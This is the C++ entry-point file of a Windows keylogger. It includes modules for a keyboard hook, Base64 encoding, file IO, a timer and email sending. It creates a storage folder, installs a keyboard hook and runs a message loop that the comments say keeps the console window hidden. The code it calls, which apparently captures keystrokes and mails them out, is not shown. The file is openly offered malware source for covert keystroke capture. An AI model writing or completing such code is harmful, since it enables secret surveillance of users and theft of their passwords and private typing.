// Keylogger.cpp : Defines the entry point for the console application.
//
#include "stdafx.h"
#include <iostream>
#include <windows.h>
#include "KeyConstants.h"
#include "Helper.h"
#include "Base64.h"
#include "IO.h"
#include "Timer.h"
#include "SendEmail.h"
#include "KeybHook.h"

using namespace std;

int main () {

	//Prevent console window from popping up
	MSG Msg;

	IO::MkDir (IO::GetOurPath (true));

	InstallHook ();

	//Infinite loop prevents console window from opening
	while (GetMessage (&Msg, NULL, 0, 0)) {
		TranslateMessage (&Msg);
		DispatchMessage (&Msg);
	}

	MailTimer.Stop ();

	return 0;
}

